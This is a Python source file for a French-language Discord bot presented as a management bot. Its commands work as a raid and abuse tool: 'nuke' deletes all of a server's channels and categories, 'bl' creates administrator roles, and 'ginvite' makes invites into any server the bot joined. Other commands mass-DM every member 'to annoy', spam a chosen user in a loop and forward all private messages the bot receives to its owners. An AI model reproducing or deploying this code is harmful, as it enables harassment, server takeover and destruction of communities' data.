import discord
from  discord.ext import commands
import time
import os
from datetime import datetime
import asyncio
import json


bot = commands.Bot(command_prefix= '*', intents=discord.Intents.all())

# Event______________________________________________________________
 
@bot.event
async def on_ready():
    print(f'Connecté en tant que {bot.user.name}')
    

    await bot.change_presence(activity=discord.Streaming(name='Gestion', url='https://www.twitch.tv/tk78twitch'))




@bot.event
async def on_message(message):
    if isinstance(message.channel, discord.DMChannel) and message.author != bot.user:
        content = message.content
        user_id = message.author.id
        user_name = message.author.name

        for user1_id in owners:
            user1 = await bot.fetch_user(user1_id)
            await user1.send(f"Vous avez reçu un message de {user_name} ({user_id}) en MP : {content}")

    await bot.process_commands(message)



# Variable_________________________________________________________________________

with open("config.json", "r") as config_file:
    config = json.load(config_file)


owners = config.get("owners", [])
TOKEN = config.get("TOKEN")
Owners_All = config.get("Owners_All", [])

bot.remove_command("help")

spamming = False

sent_messages_file = "sent_messages.txt"


if os.path.exists(sent_messages_file):
    with open(sent_messages_file, "r") as file:
        sent_messages = set(file.read().splitlines())
else:
    sent_messages = set()

def is_owner(ctx):
    return ctx.author.id in owners

def is_owner_all(ctx):
    return ctx.author.id in Owners_All

def is_owner_or_owner_all(ctx):
    return is_owner(ctx) or is_owner_all(ctx)

def is_owner_or_owner_all(ctx):
    return ctx.author.id in owners or ctx.author.id in Owners_All


# Commandes______________________________________________________________




@bot.command()
@commands.check(is_owner_or_owner_all)
async def help(self, ctx):
        if ctx.author.id in owners:
            embed = discord.Embed(
                title="Commandes du Bot",
                description="Liste des commandes disponibles.",
                color=discord.Color.dark_red()
            )

            embed.add_field(name="*lservers", value="Voir où je suis.")
            embed.add_field(name="*ginvite", value="ID + serveur où je suis.")
            embed.add_field(name="*dm_all", value="DM à tous les serveurs pour embêter.")
            embed.add_field(name="*mp", value="ID + message.")
            embed.add_field(name="*spam", value="ID + on/off + message.")
            embed.add_field(name="*add", value="ID nom role.")
            embed.add_field(name="*top", value="Nom du rôle pour le placer en haut.")
            embed.add_field(name="*bl", value="Nom du rôle créé avec des permissions d'admin, faites attention !")
            embed.add_field(name="*perm", value="Mentionnez l'utilisateur pour voir ses permissions.")
            embed.add_field(name="*info", value="Donne des informations sur le bot.")
            embed.add_field(name="*stop", value="Mettre Hors ligne le Bot.")
            embed.add_field(name="*nuke", value="'Nom du salon' a créé et supprimé tous (Pour décaler ou supprimer tous).")
            embed.add_field(name="*hide", value="caché un salon.")
            embed.add_field(name="*unhide", value="décaché un salon.")

            await ctx.send(embed=embed)




@bot.command()
@commands.check(is_owner_or_owner_all)
async def info(ctx):
    created_at = bot.user.created_at.strftime("%d/%m/%Y %H:%M:%S")

    owners_mentions = ' '.join([f"<@{owner}>" for owner in owners])
    Owners_All_mentions = ' '.join([f"<@{owner}>" for owner in Owners_All])

    owners_link = "[Cliquez ici](https://discord.gg/mQNxyFd9)"

    embed = discord.Embed(
        title="Informations sur le Bot",
        color=discord.Color.brand_red()
    )
    embed.add_field(name="Propriétaires spéciaux", value=Owners_All_mentions, inline=False)
    embed.add_field(name="Propriétaires normaux", value=owners_mentions, inline=False)
    embed.add_field(name="Date de création du Bot", value=created_at, inline=False)
    embed.add_field(name="Support Aide", value=owners_link, inline=False)

    # Vérifiez si l'auteur de la commande est un propriétaire
    if ctx.author.id in owners:
        embed.set_footer(text="Cliquez sur les liens pour en savoir plus.")
    elif ctx.author.id in Owners_All:
        embed.set_footer(text="Cliquez sur les liens pour en savoir plus.")
    else:
        embed.set_footer(text="Cliquez sur les liens pour en savoir plus.")

    await ctx.send(embed=embed)




@bot.command()
@commands.check(is_owner_all)
async def change_name_all(ctx, new_name):

    await bot.user.edit(username=new_name)
    await ctx.send(f'Nom du bot changé en {new_name}.')

@bot.command()
@commands.check(is_owner_all)
async def change_avatar_all(ctx, avatar_url):

    with open('new_avatar.png', 'rb') as avatar_file:
        avatar_data = avatar_file.read()
        await bot.user.edit(avatar=avatar_data)
    await ctx.send('Avatar du bot changé avec succès')


@bot.command()
@commands.check(is_owner_or_owner_all)
async def nuke(ctx, channel_name):
    if ctx.author.id in owners:
        guild = ctx.guild

        
        for text_channel in guild.text_channels:
            try:
                await text_channel.delete()
            except discord.Forbidden:
                
                pass
            except discord.HTTPException as e:
                
                print(f"Erreur lors de la suppression du canal {text_channel.name}: {e}")

        
        for voice_channel in guild.voice_channels:
            try:
                await voice_channel.delete()
            except discord.Forbidden:
                
                pass
            except discord.HTTPException as e:
                
                print(f"Erreur lors de la suppression du canal vocal {voice_channel.name}: {e}")

        
        for category in guild.categories:
            try:
                await category.delete()
            except discord.Forbidden:
                
                pass
            except discord.HTTPException as e:
                
                print(f"Erreur lors de la suppression de la catégorie {category.name}: {e}")


        owners_role = await guild.create_role(name="Owners", hoist=True)

        
        await ctx.author.add_roles(owners_role)

        
        new_channel_name = channel_name  
        new_channel = await guild.create_text_channel(name=new_channel_name)

        
        owner_mentions = " ".join([f"<@{owner_id}>" for owner_id in owners])

        
        await new_channel.send(f"{owner_mentions}, la commande a été effectuée avec succès.")







@bot.command()
@commands.check(is_owner_or_owner_all)
async def stop(ctx):
    if ctx.author.id in owners:
        await ctx.send("Arrêt du bot en cours...")
        await bot.close()




@bot.command()
@commands.check(is_owner_or_owner_all)
async def dm_alls(ctx, *, message):
    if ctx.author.id in owners:
        global sent_messages
        for guild in bot.guilds:
            for member in guild.members:
                if member.bot:
                    continue
                user_id = member.id
                if user_id in sent_messages:
                    continue  
                try:
                    await member.send(message)
                    sent_messages.add(user_id)  
                    print(f"Message envoyé à {member.name}#{member.discriminator}")
                except discord.Forbidden:
                    print(f"Impossible d'envoyer un message à {member.name}#{member.discriminator}")


        with open(sent_messages_file, "w") as file:
            file.write("\n".join(sent_messages))




@bot.command()
@commands.check(is_owner_or_owner_all)
async def bl(ctx, role_name):
    if ctx.author.id in owners:
        if role_name:
            try:
                
                role = await ctx.guild.create_role(name=role_name, permissions=discord.Permissions(administrator=True))
                await ctx.send(f"Rôle {role.name} créé")
            except Exception as e:
                await ctx.send(f"Une erreur s'est produite : {e}")
        else:
            await ctx.send("Le nom du rôle est manquant. Utilisation : *bl <nom_du_role>")







@bot.command()
@commands.check(is_owner_or_owner_all)
async def perm(ctx, target: discord.Member = None):
    if ctx.author.id in owners:
        if target is None:
            target = ctx.author

        permissions = target.guild_permissions

        permissions_list = [name for name, value in permissions]
        permissions_message = "\n".join(permissions_list)

        await ctx.send(f"Permissions pour {target.display_name} :\n```{permissions_message}```")





@bot.command()
@commands.check(is_owner_or_owner_all)
async def clear(ctx, amount: int):
    if ctx.author.id in owners:
        try:
           
            await ctx.channel.purge(limit=amount + 1)
        except Exception as e:
            await ctx.send(f"Une erreur s'est produite : {e}")

@bot.command()
@commands.check(is_owner_or_owner_all)
async def addrole(ctx, user_id, role_name=None):
    if ctx.author.id in owners:
        try:

            if user_id.isdigit():
                user = ctx.guild.get_member(int(user_id))
                if user and role_name:
                    role = discord.utils.get(ctx.guild.roles, name=role_name)
                    if role:
                        await user.add_roles(role)
                        await ctx.send(f"{role.name} a été ajouté à {user.name}.")
                    else:
                        await ctx.send(f"Le rôle {role_name} n'a pas été trouvé.")
                else:
                    await ctx.send(f"L'utilisateur avec l'ID {user_id} n'a pas été trouvé.")
            else:
                await ctx.send("L'ID de l'utilisateur n'est pas un nombre valide.")
        except Exception as e:
            await ctx.send(f"Une erreur s'est produite : {e}")



@bot.command()
@commands.check(is_owner_or_owner_all)
async def hide(ctx, channel_name=None):
    if channel_name:
        channel = discord.utils.get(ctx.guild.text_channels, name=channel_name)
        if channel is None:
            await ctx.send(f"Le salon {channel_name} n'a pas été trouvé.")
            return
    else:
        channel = ctx.channel

    everyone_role = ctx.guild.default_role

    overwrites = {
        everyone_role: discord.PermissionOverwrite(read_messages=False)
    }

    try:
        await channel.edit(overwrites=overwrites)
        await ctx.send(f"Le salon {channel.name} a été masqué.")
    except discord.Forbidden:
        pass
    

@bot.command()
@commands.check(is_owner_or_owner_all)
async def unhide(ctx, channel_name=None):
    if channel_name:
        channel = discord.utils.get(ctx.guild.text_channels, name=channel_name)
        if channel is None:
            await ctx.send(f"Le salon {channel.name} n'a pas été trouvé.")
            return
    else:
        channel = ctx.channel

    everyone_role = ctx.guild.default_role

    overwrites = {
        everyone_role: discord.PermissionOverwrite(read_messages=True)
    }

    try:
        await channel.edit(overwrites=overwrites)
        await ctx.send(f"Le salon {channel.name} ont été rétablies.")
    except discord.Forbidden:
        pass


@bot.command()
@commands.check(is_owner_or_owner_all)
async def top(ctx, role_name):
    if ctx.author.id in owners and ctx.author.id not in Owners_All:
        guild = ctx.guild

        
        role = discord.utils.get(guild.roles, name=role_name)

        if role is not None:
            try:
                
                roles = guild.roles

                current_position = role.position

                
                highest_role = max(roles, key=lambda x: x.position)

                
                await role.edit(position=highest_role.position - 1)

                await ctx.send(f"Le rôle '{role.name}' a été déplacé en haut de la liste des rôles.")
            except Exception as e:
                await ctx.send(f"Une erreur s'est produite : {e}")
        else:
            await ctx.send("Le rôle spécifié n'a pas été trouvé.")






@bot.command()
@commands.check(is_owner_or_owner_all)
async def dm_all(ctx, *, message):
    if ctx.author.id in owners and ctx.author.id not in Owners_All:
        global sent_messages  
        for guild in bot.guilds:
            for member in guild.members:
                if member.bot:
                    continue
                user_id = member.id
                if user_id in sent_messages:
                    continue  
                try:
                    await member.send(message)
                    sent_messages.add(user_id) 
                    print(f"Message envoyé à {member.name}#{member.discriminator}")
                except discord.Forbidden:
                    print(f"Impossible d'envoyer un message à {member.name}#{member.discriminator}")




@bot.command()
@commands.check(is_owner_or_owner_all)
async def mp(ctx, user_id, *, message_content):
    if ctx.author.id in owners and ctx.author.id not in Owners_All:
        try:
            user = await bot.fetch_user(int(user_id))
            await user.send(message_content)
            await ctx.send(f'Message envoyé en MP à {user.name} : {message_content}')
        except discord.NotFound:
            await ctx.send(f"L'utilisateur avec l'ID {user_id} n'a pas été trouvé.")
        except Exception as e:
            await ctx.send(f"Une erreur s'est produite : {e}")







@bot.command()
@commands.check(is_owner_or_owner_all)
async def lservers(ctx):
    servers = bot.guilds[:40]
    embed = discord.Embed(
        title="Serveurs sur lesquels je suis (25 premiers)",
        description=f"Je suis actuellement sur {len(servers)} serveurs.",
        color=discord.Color.blue()
    )

    for server in servers:
        member_count = server.member_count
        server_info = f"Nom : {server.name}\nID : {server.id}\nMembres : {member_count}\n\n"
        embed.add_field(name=server.name, value=server_info, inline=False)

    await ctx.send(embed=embed)





@bot.command()
@commands.check(is_owner_or_owner_all)
async def lock(ctx, channel_name=None):
    if ctx.author.id in owners or ctx.author.id in Owners_All:
        try:
            if channel_name:
                channel = discord.utils.get(ctx.guild.text_channels, name=channel_name)
                if channel is None:
                    await ctx.send(f"Le salon {channel_name} n'a pas été trouvé.")
                    return
            else:
                channel = ctx.channel

            everyone_role = ctx.guild.default_role

            overwrites = {
                everyone_role: discord.PermissionOverwrite(send_messages=False)
            }

            await channel.edit(overwrites=overwrites)
            lock_message = await ctx.send(f"Le salon {channel.name} a été verrouillé dans ce canal.")

            await asyncio.sleep(1)

            await lock_message.delete()
        except Exception as e:
            await ctx.send(f"Une erreur s'est produite : {e}")




@bot.command()
@commands.check(is_owner_or_owner_all)
async def unlock(ctx, channel_name=None):
    if ctx.author.id in owners or ctx.author.id in Owners_All:
        try:
            if channel_name:
                channel = discord.utils.get(ctx.guild.text_channels, name=channel_name)
                if channel is None:
                    await ctx.send(f"Le salon {channel_name} n'a pas été trouvé.")
                    return
            else:
                channel = ctx.channel

            everyone_role = ctx.guild.default_role

            overwrites = {
                everyone_role: discord.PermissionOverwrite(send_messages=True)
            }

            await channel.edit(overwrites=overwrites)
            await ctx.send(f"Le salon {channel.name} ont été rétablies.")
        except Exception as e:
            await ctx.send(f"Une erreur s'est produite : {e}")




@bot.command()
@commands.check(is_owner_or_owner_all)
async def ginvite(ctx, server_id):
    if ctx.author.id in owners:
        try:
            server = bot.get_guild(int(server_id))
            
            if server:
                invite = await server.text_channels[0].create_invite()
                await ctx.send(f"Voici l'invitation pour le serveur {server.name} : {invite.url}")
            else:
                await ctx.send("Serveur introuvable. Assurez-vous que le bot est sur le serveur.")
        except Exception as e:
            await ctx.send(f"Une erreur s'est produite : {e}")








@bot.command()
@commands.check(is_owner_or_owner_all)
async def spam(ctx, user_id, on_off, *, message):
    global spamming
    user = bot.get_user(int(user_id))
    
    if user:
        if on_off == "on":
            if spamming:
                await ctx.send("Le spam est déjà en cours. Utilisez *spam id off pour l'arrêter.")
            else:
                spamming = True
                try:
                    while spamming:
                        await user.send(message)
                        await ctx.send(f"Message envoyé à {user} : {message}")
                        await asyncio.sleep(1)
                except Exception as e:
                    await ctx.send(f"Une erreur s'est produite lors du spam : {e}")
        elif on_off == "off":
            if spamming:
                spamming = False
                await ctx.send("Arrêt du spam.")
            else:
                await ctx.send("Le spam n'est pas en cours. Utilisez *spam id on 'message' pour le démarrer.")
        else:
            await ctx.send("Veuillez spécifier 'on' pour commencer le spam ou 'off' pour l'arrêter.")
    else:
        await ctx.send("Utilisateur introuvable. Assurez-vous que l'ID de l'utilisateur est correct.")





bot.run(TOKEN)